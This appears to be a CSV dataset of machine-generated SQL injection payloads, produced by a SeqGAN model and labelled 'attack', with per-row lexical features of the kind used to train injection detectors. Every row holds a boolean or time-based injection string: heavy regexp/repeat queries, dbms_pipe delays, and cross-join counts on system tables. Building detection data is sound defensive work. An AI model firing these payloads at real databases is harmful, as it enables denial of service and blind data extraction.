label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,271,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,272,249.0,37.0,3.7699762975045767,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,273,211.0,29.0,3.460303519138428,111.0,12.0,65.0,23.0,0.5260663507109005,0.05687203791469194,0.3080568720379147,0.10900473933649289,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,2.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,274,136.0,29.0,3.7987491998165743,40.0,16.0,52.0,28.0,0.29411764705882354,0.11764705882352941,0.38235294117647056,0.20588235294117646,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,275,249.0,37.0,3.7699762975045767,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,276,242.0,37.0,3.7738749558776066,74.0,29.0,96.0,43.0,0.30578512396694213,0.11983471074380166,0.39669421487603307,0.17768595041322313,2.0,0.0,0.0,0.0,0.0,1.0,0.0,22.0,2.0,2.0,4.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,277,63.0,21.0,3.263463006131453,5.0,16.0,28.0,14.0,0.07936507936507936,0.25396825396825395,0.4444444444444444,0.2222222222222222,4.0,0.0,1.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,278,189.0,34.0,3.769406760876639,55.0,24.0,76.0,34.0,0.291005291005291,0.12698412698412698,0.4021164021164021,0.17989417989417988,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,279,129.0,30.0,3.3838632592235856,34.0,13.0,61.0,21.0,0.26356589147286824,0.10077519379844961,0.4728682170542636,0.16279069767441862,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,280,129.0,30.0,3.3838632592235856,34.0,13.0,61.0,21.0,0.26356589147286824,0.10077519379844961,0.4728682170542636,0.16279069767441862,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,r%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,281,59.0,19.0,3.1138155015690216,6.0,12.0,28.0,13.0,0.1016949152542373,0.2033898305084746,0.4745762711864407,0.22033898305084745,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,282,129.0,30.0,3.3838632592235856,34.0,13.0,61.0,21.0,0.26356589147286824,0.10077519379844961,0.4728682170542636,0.16279069767441862,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,283,249.0,37.0,3.7699762975045767,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,284,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,285,129.0,30.0,3.3838632592235856,34.0,13.0,61.0,21.0,0.26356589147286824,0.10077519379844961,0.4728682170542636,0.16279069767441862,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,286,211.0,29.0,3.460303519138428,111.0,12.0,65.0,23.0,0.5260663507109005,0.05687203791469194,0.3080568720379147,0.10900473933649289,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,2.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,287,63.0,21.0,3.263463006131453,5.0,16.0,28.0,14.0,0.07936507936507936,0.25396825396825395,0.4444444444444444,0.2222222222222222,4.0,0.0,1.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,288,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,289,136.0,29.0,3.7987491998165743,40.0,16.0,52.0,28.0,0.29411764705882354,0.11764705882352941,0.38235294117647056,0.20588235294117646,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,290,148.0,30.0,3.93750985154671,75.0,8.0,45.0,20.0,0.5067567567567568,0.05405405405405406,0.30405405405405406,0.13513513513513514,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,291,211.0,29.0,3.460303519138428,111.0,12.0,65.0,23.0,0.5260663507109005,0.05687203791469194,0.3080568720379147,0.10900473933649289,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,2.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,292,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,293,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,294,148.0,30.0,3.93750985154671,75.0,8.0,45.0,20.0,0.5067567567567568,0.05405405405405406,0.30405405405405406,0.13513513513513514,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,295,249.0,37.0,3.7699762975045767,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,296,249.0,37.0,3.7699762975045767,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,297,189.0,34.0,3.769406760876639,55.0,24.0,76.0,34.0,0.291005291005291,0.12698412698412698,0.4021164021164021,0.17989417989417988,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,298,136.0,29.0,3.7987491998165743,40.0,16.0,52.0,28.0,0.29411764705882354,0.11764705882352941,0.38235294117647056,0.20588235294117646,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-8004%8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,299,68.0,21.0,3.3372818151594625,5.0,20.0,28.0,15.0,0.07352941176470588,0.29411764705882354,0.4117647058823529,0.22058823529411764,4.0,0.0,1.0,0.0,1.0,2.0,0.0,4.0,3.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V3__sql_aware__len20__gpre80__reward_off__seed88,300,203.0,33.0,3.685208742037786,56.0,27.0,84.0,36.0,0.27586206896551724,0.1330049261083744,0.41379310344827586,0.17733990147783252,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
